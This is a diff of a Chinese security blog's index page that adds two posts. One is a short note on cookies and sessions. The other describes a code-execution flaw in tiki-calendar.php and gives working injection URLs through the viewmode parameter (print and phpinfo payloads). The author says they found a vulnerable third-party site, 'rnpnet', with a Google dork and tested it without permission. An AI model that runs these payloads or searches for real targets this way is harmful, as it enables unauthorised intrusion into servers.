@@ -260,6 +260,293 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/01/代码执行/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Hu3sky">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/ctf/头像.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hu3sky">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/01/代码执行/" itemprop="url">rnpnet tiki-calendar.php页面存在代码执行漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-01T00:00:00+08:00">
+                2018-04-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码执行/" itemprop="url" rel="index">
+                    <span itemprop="name">代码执行</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>emmm。最近跟着彭哥做项目，疯狂的复现一些cve，包括上传漏洞和代码执行漏洞。</p>
+<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>因为这个漏洞是发生在calendar.php。由于exp给的源码本地没有复现成功，所以想着去外面看看能不能找到洞。于是 谷歌 inurl:tiki-calendar.php。找到一堆，试了前面几个 不行，于是在尝试到rnpnet的时候，意外的惊喜出现了。</p>
+<h1 id="0x02漏洞利用"><a href="#0x02漏洞利用" class="headerlink" title="0x02漏洞利用"></a>0x02漏洞利用</h1><p><a href="http://yoururl/tiki-calendar.php?viewmode=%27;print(%27Hu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BC%27);$a=%27&gt;" target="_blank" rel="noopener">http://yoururl/tiki-calendar.php?viewmode=%27;print(%27Hu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BCHu3sky%E7%89%9B%E9%80%BC%27);$a=%27&gt;</a> ！<a href="/ctf/代码执行1.png">复现</a>emmm。不要在意输出的是什么，略过略过。<br><a href="http://yoururl/tiki-calendar.php?viewmode=%27;phpinfo();$a=%27" target="_blank" rel="noopener">http://yoururl/tiki-calendar.php?viewmode=%27;phpinfo();$a=%27</a> 这样就直接输出了phpinfo<br>！<a href="/ctf/代码执行.png">phpfinfo</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/28/cookie与session/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Hu3sky">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/ctf/头像.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hu3sky">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/03/28/cookie与session/" itemprop="url">cookie与session的笔记</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-28T22:33:08+08:00">
+                2018-03-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/http协议/" itemprop="url" rel="index">
+                    <span itemprop="name">http协议</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="0x00-Cookie"><a href="#0x00-Cookie" class="headerlink" title="0x00 Cookie"></a>0x00 Cookie</h1><p>Cookie是通过在客户端记录信息确定用户身份<br>Cookie分为永久性和会话cookie。永久性保存在客户端的硬盘中，会话cookie在会话结束后，失效</p>
+<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>Session是通过在服务器端记录信息确定用户身份<br>用户第一次访问web站点时，由服务器记录会话，并生成sessionID用来标识一个客户端会话。客户端后续的会话，会由浏览器携带这个sessionID<br>session的sessionID时放在cookie里</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/23/VehicleWorkshop/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -736,7 +1023,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -747,7 +1034,7 @@
               
               <div class="site-state-item site-state-categories">
                 
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">分类</span>
                 
               </div>
